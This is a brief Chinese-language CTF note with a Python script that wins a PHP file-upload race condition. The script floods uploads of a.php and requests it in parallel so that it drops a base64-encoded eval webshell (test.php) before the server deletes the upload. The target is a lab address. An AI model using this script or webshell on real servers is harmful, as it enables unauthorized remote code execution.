tags:: CTF/PHP/文件上传

- 在文件删除之前使用webshell
-
- 脚本：
- ```python
  import requests
  import time
  import threading
  
  url = "http://172.17.0.2"
  
  def get_file():
  
      for i in range(100000):
          try:
              r = requests.get(f"{url}/upload/a.php", params = {
                  "i": i
              })
              if r.status_code not in [404, 500]:
                  print("Yep", i)
                  print(r.status_code)
                  print(r.text)
                  break
          except Exception:
              time.sleep(0.1)
              continue
          if i % 50 == 1:
              print("GET ", i)
  
  def post_file():
      for i in range(100000):
          try:
              r = requests.post(
                  url, 
                  params = {
                      "i": i
                  }, 
                  files = {
                      "uploaded": (
                          "a.php", 
                          "<?php file_put_contents('test.php', base64_decode('PD9waHAgZXZhbCgkX1BPU1RbZGF0YV0pOz8+Cg=='));?>"
                      )
                  }
              )
          except Exception:
              time.sleep(0.1)
              continue
          if i % 50 == 1:
              print("POST", i)
  
  t1 = threading.Thread(target = post_file)
  
  t2 = threading.Thread(target = get_file)
  
  t1.daemon = True
  
  t1.start()
  t2.start()
  
  t2.join()
  
  ```
- 跑完脚本就可以得到`/upload/test.php`这个webshell